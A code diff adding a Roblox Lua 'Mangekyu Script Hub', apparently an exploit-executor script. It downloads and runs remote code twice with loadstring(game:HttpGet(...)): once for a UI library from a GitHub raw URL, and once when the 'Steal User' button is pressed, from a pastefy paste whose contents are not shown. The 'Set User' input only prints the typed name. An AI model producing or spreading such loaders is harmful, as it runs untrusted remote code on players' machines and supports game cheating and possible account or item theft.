@@ -1,0 +1,57 @@
+local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/GRPGaming/Key-System/refs/heads/Xycer-Hub-Script/ZusumeLib(Slider)"))()
+
+local Window = OrionLib:MakeWindow({
+    Name = "Mangekyu Script Hub",
+    HidePremium = false,
+    SaveConfig = true,
+    ConfigFolder = "MyScriptConfig"
+})
+
+local Tab = Window:MakeTab({
+    Name = "Main",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+-- Run External Script from Pastefy
+Tab:AddButton({
+    Name = "Steal User",
+    Callback = function()
+        local success, result = pcall(function()
+            loadstring(game:HttpGet("https://pastefy.app/WXSwotwy/raw"))()
+        end)
+        if success then
+            print("External script ran successfully.")
+        else
+            warn("Failed to load script:", result)
+        end
+    end
+})
+
+-- Textbox for typing input
+local userInput = ""
+
+Tab:AddTextbox({
+    Name = "User",
+    Default = "",
+    TextDisappear = false,
+    Callback = function(Value)
+        userInput = Value
+    end
+})
+
+-- Button to print the typed input
+Tab:AddButton({
+    Name = "Set User",
+    Callback = function()
+        print("User typed:", userInput)
+        OrionLib:MakeNotification({
+            Name = "Typed Text",
+            Content = "Set User: " .. userInput,
+            Time = 4
+        })
+    end
+})
+
+-- Finalize the UI
+OrionLib:Init()
